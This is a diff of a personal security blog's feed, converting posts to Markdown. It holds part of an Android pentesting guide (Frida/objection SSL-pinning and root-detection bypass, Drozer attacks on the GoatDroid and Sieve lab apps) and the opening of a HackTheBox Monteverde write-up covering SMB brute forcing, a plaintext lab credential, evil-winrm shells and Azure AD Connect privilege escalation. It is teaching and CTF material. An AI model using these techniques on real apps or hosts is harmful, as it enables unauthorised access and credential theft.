+Download the Frida Server script according to above command output from the following link: [https://github.com/frida/frida/releases/](https://github.com/frida/frida/releases/)
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Push Frida Server to device&lt;/code&gt;&lt;/p&gt;
+--&gt; `Push Frida Server to device`
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ adb push frida-server-12.8.14-android-x86 /data/local/tmp&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;$ adb shell chmod 777 /data/local/tmp/frida-server-12.8.14-android-x86&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Bypass SSL pinning &amp;amp; Root Detection&lt;/code&gt;&lt;/p&gt;
+```yml
+$ adb push frida-server-12.8.14-android-x86 /data/local/tmp
+$ adb shell chmod 777 /data/local/tmp/frida-server-12.8.14-android-x86
+```
+--&gt; `Bypass SSL pinning &amp; Root Detection`
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ adb push fridascript.js /data/local/tmp&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;$ adb shell /data/local/tmp/frida-server-12.8.14-android-x86 &amp;amp; (Running frida server)&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;$ frida-ps -u (Check running processes in device)&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;$ objection –gadget com.ril.ajio explore → android sslpinning disable/android root&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;disable(For bypassing Root Detection)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+```yml
+$ adb push fridascript.js /data/local/tmp
+$ adb shell /data/local/tmp/frida-server-12.8.14-android-x86 &amp; (Running frida server)
+$ frida-ps -u (Check running processes in device)
+$ objection –gadget com.ril.ajio explore → android sslpinning disable/android root
+disable(For bypassing Root Detection)
+```
 
 &lt;p id=&quot;chapter5&quot;&gt;&amp;nbsp;&lt;/p&gt;
 
-&lt;h2&gt;Chapter 5: Interactive Analysis &lt;/h2&gt;
+&lt;h2 &gt;Chapter 5: Interactive Analysis &lt;/h2&gt;
 
-&lt;p&gt;Interactive Anaylysis can also be called as &lt;strong&gt;Ineteractive Application Security Assessment (IAST)&lt;/strong&gt;. It is basically combination &lt;strong&gt;Static Application Security Assessment (SAST)&lt;/strong&gt; and &lt;strong&gt;Dynamic Application Security Assessment (DAST)&lt;/strong&gt;. In layman terms, &lt;strong&gt;DAST&lt;/strong&gt; deals at interactive level .i.e at runtime level where the application is performing it’s functionality. Following is the list of methods that can used in &lt;strong&gt;DAST&lt;/strong&gt; methodology:&lt;/p&gt;
+Interactive Anaylysis can also be called as **Ineteractive Application Security Assessment (IAST)**. It is basically combination **Static Application Security Assessment (SAST)** and **Dynamic Application Security Assessment (DAST)**. In layman terms, **DAST** deals at interactive level .i.e at runtime level where the application is performing it's functionality. Following is the list of methods that can used in **DAST** methodology:
 
 &lt;h3&gt;5.1 || Drozer &lt;/h3&gt;
 
-&lt;p&gt;Drozer provides tools to help you use and share public exploits for android. It is primarily used to assess following components in Android:&lt;/p&gt;
+Drozer provides tools to help you use and share public exploits for android. It is primarily used to assess following components in Android:
 
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;Content Provider&lt;/strong&gt;: It supplies data from one application to another. It can store the data in the file system, a SQLite Database, or the web, or any persistent storage location your app can access. It is used to share data among applications via queries such as insert(), update(), delete() and query()&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;Activity&lt;/strong&gt;: An activity represents a single screen with a user interface. For example, a login page can be called as an activity&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;Services&lt;/strong&gt;: A service is a component that runs in the background to perform long-running operations or to perform for remote processes and it does not have user interface. For example, Maps service running in the background.&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;Broadcast Receivers&lt;/strong&gt;: A broadcast receiver is a component that responds to system-wide broadcast announcements&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
+- **Content Provider**: It supplies data from one application to another. It can store the data in the file system, a SQLite Database, or the web, or any persistent storage location your app can access. It is used to share data among applications via queries such as insert(), update(), delete() and query()
 
-&lt;p&gt;Let’s move on to usage of drozer&lt;/p&gt;
+- **Activity**: An activity represents a single screen with a user interface. For example, a login page can be called as an activity
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Install drozer agent in client&lt;/code&gt;&lt;/p&gt;
+- **Services**: A service is a component that runs in the background to perform long-running operations or to perform for remote processes and it does not have user interface. For example, Maps service running in the background.
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/13.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+- **Broadcast Receivers**: A broadcast receiver is a component that responds to system-wide broadcast announcements
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Activate Drozer Agent&lt;/code&gt;&lt;/p&gt;
+Let’s move on to usage of drozer
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/14.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+--&gt; `Install drozer agent in client`
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Connect to Drozer Agent via below command&lt;/code&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/13.png){:class=&quot;img-fluid&quot;}
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ adb forward tcp:31415 tcp:31415&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;$ drozer console connect&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/15.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+--&gt; `Activate Drozer Agent`
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Atacking Activities&lt;/code&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/14.png){:class=&quot;img-fluid&quot;}
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ run app.activity,info -a org.owasp.goatdroid.fourgoats&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+--&gt; `Connect to Drozer Agent via below command`
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/16.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+```yml
+$ adb forward tcp:31415 tcp:31415
+$ drozer console connect
+```
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ run app.activity.start –-component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.activities.ViewProfile&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/17.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/15.png){:class=&quot;img-fluid&quot;}
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Atacking Services&lt;/code&gt;&lt;/p&gt;
+--&gt; `Atacking Activities`
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ run app.service.info -a org.owasp.goatdroid.fourgoats&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+```yml
+$ run app.activity,info -a org.owasp.goatdroid.fourgoats
+```
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/18.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/16.png){:class=&quot;img-fluid&quot;}
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+```yml
+$ run app.activity.start –-component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.activities.ViewProfile
+```
+![deploy using travis](/assets/img/posts/Mobile_Security/17.png){:class=&quot;img-fluid&quot;}
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/19.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+--&gt; `Atacking Services`
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Atacking Broadcast Receivers&lt;/code&gt;&lt;/p&gt;
+```yml
+$ run app.service.info -a org.owasp.goatdroid.fourgoats
+```
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ run app.package.info -a org.owasp.goatdroid.fourgoats&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/18.png){:class=&quot;img-fluid&quot;}
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/20.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+```yml
+$ run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService
+```
 
-&lt;p&gt;To exploit SendSMSNowReceiver, we need to check corresponding action name in AndroidManifest.xml file which can be extracted with the help of apktool command. Following is the command to run:&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/19.png){:class=&quot;img-fluid&quot;}
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ apktool d goatdroid.apk&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/21.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+--&gt; `Atacking Broadcast Receivers`
 
-&lt;p&gt;To call the broadcast receiver, we need to send few parameters which can be found in decompiled jar version as explained in dex2jar chapter.&lt;/p&gt;
+```yml
+$ run app.package.info -a org.owasp.goatdroid.fourgoats
+```
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/22.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/20.png){:class=&quot;img-fluid&quot;}
 
-&lt;p&gt;Following command triggers Broadcast receivers:&lt;/p&gt;
+To exploit SendSMSNowReceiver, we need to check corresponding action name in AndroidManifest.xml file which can be extracted with the help of apktool command. Following is the command to run:
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 1234 --extra string message &quot;Hey!&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+```yml
+$ apktool d goatdroid.apk
+```
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/23.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/21.png){:class=&quot;img-fluid&quot;}
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/24.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+To call the broadcast receiver, we need to send few parameters which can be found in decompiled jar version as explained in dex2jar chapter.
 
-&lt;p&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Atacking Content Providers&lt;/code&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/22.png){:class=&quot;img-fluid&quot;}
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ run app.provider.finduri com.mwr.example.sieve&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+Following command triggers Broadcast receivers: 
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/25.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;
+```yml
+$ run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 1234 --extra string message &quot;Hey!&quot;
+```
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/23.png){:class=&quot;img-fluid&quot;}
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/Mobile_Security/26.png&quot; alt=&quot;deploy using travis&quot; class=&quot;img-fluid&quot; /&gt;&lt;/p&gt;</content><author><name>Rajat Rao</name></author><category term="[&quot;HackTheBox&quot;]" /><summary type="html"></summary></entry><entry><title type="html">HackTheBox Monteverde Writeup</title><link href="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/" rel="alternate" type="text/html" title="HackTheBox Monteverde Writeup" /><published>2020-06-05T15:22:20+05:30</published><updated>2020-06-05T15:22:20+05:30</updated><id>http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde</id><content type="html" xml:base="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/">&lt;h2 id=&quot;brief&quot;&gt;Brief&lt;/h2&gt;
-&lt;p&gt;    On enumerating different services of &lt;code class=&quot;highlighter-rouge&quot;&gt;Monteverde&lt;/code&gt; machine, we were able extract list of users available in the target machine. Due to security misconfiguration, one of the users has set the password same as the username and this was identified by brute forcing the same using &lt;code class=&quot;highlighter-rouge&quot;&gt;smb_login&lt;/code&gt; module from &lt;code class=&quot;highlighter-rouge&quot;&gt;metasploit&lt;/code&gt;. Levering the misconfiguration, we were able to login to &lt;code class=&quot;highlighter-rouge&quot;&gt;SMB&lt;/code&gt; with the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; and on further enumeration, we were able to extract a file named &lt;code class=&quot;highlighter-rouge&quot;&gt;azure.xml&lt;/code&gt; under &lt;code class=&quot;highlighter-rouge&quot;&gt;mhope&lt;/code&gt; user folder consisting of credentails of the same user. Making the use of credential found, we were able to get &lt;code class=&quot;highlighter-rouge&quot;&gt;Windows Remote Management&lt;/code&gt; shell with the help of tool named &lt;code class=&quot;highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt; which targets on port &lt;code class=&quot;highlighter-rouge&quot;&gt;5985&lt;/code&gt; port. Here, we were able to get basic shell and were able pwn the &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; part of the challenge. Moving to privilege escalation part, enumemrating local system, we were able to understand the target machine has &lt;code class=&quot;highlighter-rouge&quot;&gt;Azure Active Directory Connect&lt;/code&gt;. On searching for exploits on google, we were able to find a script and privilege to highest level of authorization and complete the final challenge of getting &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/24.png){:class=&quot;img-fluid&quot;}
 
-&lt;p&gt; &lt;/p&gt;
 
-&lt;h2 id=&quot;flow&quot;&gt;Flow&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;enum4linux&lt;/code&gt; reveals list of users name&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Brute Forcing &lt;code class=&quot;highlighter-rouge&quot;&gt;SMb&lt;/code&gt; via &lt;code class=&quot;highlighter-rouge&quot;&gt;metasploit&lt;/code&gt; using the usernames as password identifies a legit credential (&lt;code class=&quot;highlighter-rouge&quot;&gt;SABatchJobs:SABatchJobs&lt;/code&gt;)&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Login as &lt;code class=&quot;highlighter-rouge&quot;&gt;SABatchJobs&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;SMB&lt;/code&gt; via &lt;code class=&quot;highlighter-rouge&quot;&gt;smbcleint&lt;/code&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Enumerate &lt;code class=&quot;highlighter-rouge&quot;&gt;mhope&lt;/code&gt; folder and download &lt;code class=&quot;highlighter-rouge&quot;&gt;azure.xml&lt;/code&gt; which consists of mhope credentials (&lt;code class=&quot;highlighter-rouge&quot;&gt;mhope:4n0therD4y@n0th3r$&lt;/code&gt;)&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Login as &lt;code class=&quot;highlighter-rouge&quot;&gt;mhope&lt;/code&gt; in Win-RM Service (5985) using &lt;code class=&quot;highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Get &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Local enumeramation discloses usage of &lt;code class=&quot;highlighter-rouge&quot;&gt;Azure AD Connect&lt;/code&gt; in target machine&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Search for Azure AD exploit leads to powershell script (module) to generate new &lt;code class=&quot;highlighter-rouge&quot;&gt;administrator&lt;/code&gt; password in the target machine&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Use newly generated &lt;code class=&quot;highlighter-rouge&quot;&gt;administrator&lt;/code&gt; credentials and login as &lt;code class=&quot;highlighter-rouge&quot;&gt;administrator&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;Win-RM service&lt;/code&gt; (5985) using &lt;code class=&quot;highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Get &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
+--&gt; `Atacking Content Providers`
 
-&lt;p&gt; &lt;/p&gt;
+```yml
+$ run app.provider.finduri com.mwr.example.sieve
+```
 
-&lt;p&gt;Below is a detail writeup of the machine following the below steps:&lt;/p&gt;
+![deploy using travis](/assets/img/posts/Mobile_Security/25.png){:class=&quot;img-fluid&quot;}
 
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#informationgathering&quot;&gt;Information Gathering&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#lowprivilegeshell&quot;&gt;Low-Privilege Shell&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/#privilegeescaltion&quot;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
+```yml
+$ run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys
+```
+
+![deploy using travis](/assets/img/posts/Mobile_Security/26.png){:class=&quot;img-fluid&quot;}</content><author><name>Rajat Rao</name></author><category term="[&quot;HackTheBox&quot;]" /><summary type="html"></summary></entry><entry><title type="html">HackTheBox Monteverde Writeup</title><link href="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/" rel="alternate" type="text/html" title="HackTheBox Monteverde Writeup" /><published>2020-06-05T15:22:20+05:30</published><updated>2020-06-05T15:22:20+05:30</updated><id>http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde</id><content type="html" xml:base="http://localhost:4000/hackthebox/2020/06/05/HackTheBox-Monteverde/">## Brief
+&amp;nbsp; &amp;nbsp; On enumerating different services of `Monteverde` machine, we were able extract list of users available in the target machine. Due to security misconfiguration, one of the users has set the password same as the username and this was identified by brute forcing the same using `smb_login` module from `metasploit`. Levering the misconfiguration, we were able to login to `SMB` with the help of `smbclient` and on further enumeration, we were able to extract a file named `azure.xml` under `mhope` user folder consisting of credentails of the same user. Making the use of credential found, we were able to get `Windows Remote Management` shell with the help of tool named `evil-winrm` which targets on port `5985` port. Here, we were able to get basic shell and were able pwn the `user.txt` part of the challenge. Moving to privilege escalation part, enumemrating local system, we were able to understand the target machine has `Azure Active Directory Connect`. On searching for exploits on google, we were able to find a script and privilege to highest level of authorization and complete the final challenge of getting `root.txt`
+
+&amp;nbsp;
+
+## Flow
+- `enum4linux` reveals list of users name
+
+- Brute Forcing `SMb` via `metasploit` using the usernames as password identifies a legit credential (`SABatchJobs:SABatchJobs`)
+
+- Login as `SABatchJobs` in `SMB` via `smbcleint`
+
+- Enumerate `mhope` folder and download `azure.xml` which consists of mhope credentials (`mhope:4n0therD4y@n0th3r$`)
+
+- Login as `mhope` in Win-RM Service (5985) using `evil-winrm`
+
+- Get `user.txt`
+
+- Local enumeramation discloses usage of `Azure AD Connect` in target machine
+
+- Search for Azure AD exploit leads to powershell script (module) to generate new `administrator` password in the target machine
+
+- Use newly generated `administrator` credentials and login as `administrator` in `Win-RM service` (5985) using `evil-winrm`
+
+- Get `root.txt`
+
+&amp;nbsp;
+
+Below is a detail writeup of the machine following the below steps:
+
+1. [Information Gathering]({{site.url}}/hackthebox/2020/06/05/HackTheBox-Monteverde/#informationgathering)
+
+2. [Low-Privilege Shell]({{site.url}}/hackthebox/2020/06/05/HackTheBox-Monteverde/#lowprivilegeshell)
+
+3. [Privilege Escalation]({{site.url}}/hackthebox/2020/06/05/HackTheBox-Monteverde/#privilegeescaltion)
 
 &lt;p id=&quot;informationgathering&quot;&gt;&amp;nbsp;&lt;/p&gt;
 
-&lt;h2 id=&quot;1-information-gathering&quot;&gt;1. Information Gathering&lt;/h2&gt;
-&lt;p&gt; &lt;/p&gt;
-&lt;h3 id=&quot;11--nmap&quot;&gt;1.1 || Nmap&lt;/h3&gt;
-
-&lt;p&gt;-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Run nmap&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;$ nmap -sC -sV -p- -oA full 10.10.10.172&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;where,&lt;/p&gt;
-
-&lt;p&gt;    -sC : Run Default Scripts&lt;/p&gt;
-
-&lt;p&gt;    -sV : Enumerate different versions&lt;/p&gt;
-
-&lt;p&gt;    -sC : Store the output in all format (.nmap, .xml and .gnmap) having name full&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&lt;span class=&quot;c1&quot;&gt;# Nmap 7.80 scan initiated Tue May 26 14:02:41 2020 as: nmap -sC -sV -p- -oA full -Pn 10.10.10.172&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Nmap scan report for 10.10.10.172&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;Host is up (0.13s latency).&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Not shown&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;65516 filtered ports&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;PORT      STATE SERVICE       VERSION&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;53/tcp    open  domain?&lt;/span&gt;
-   &lt;span class=&quot;s&quot;&gt;fingerprint-strings&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
-   &lt;span class=&quot;na&quot;&gt;DNSVersionBindReqTCP&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; 
-     &lt;span class=&quot;s&quot;&gt;version&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;_    bind&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;2020-05-26 07:53:02Z)&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;135/tcp   open  msrpc         Microsoft Windows RPC&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;MEGABANK.LOCAL0., Site&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Default-First-Site-Name)&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;445/tcp   open  microsoft-ds?&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;464/tcp   open  kpasswd5?&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.0&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;636/tcp   open  tcpwrapped&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;MEGABANK.LOCAL0., Site&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Default-First-Site-Name)&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;3269/tcp  open  tcpwrapped&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
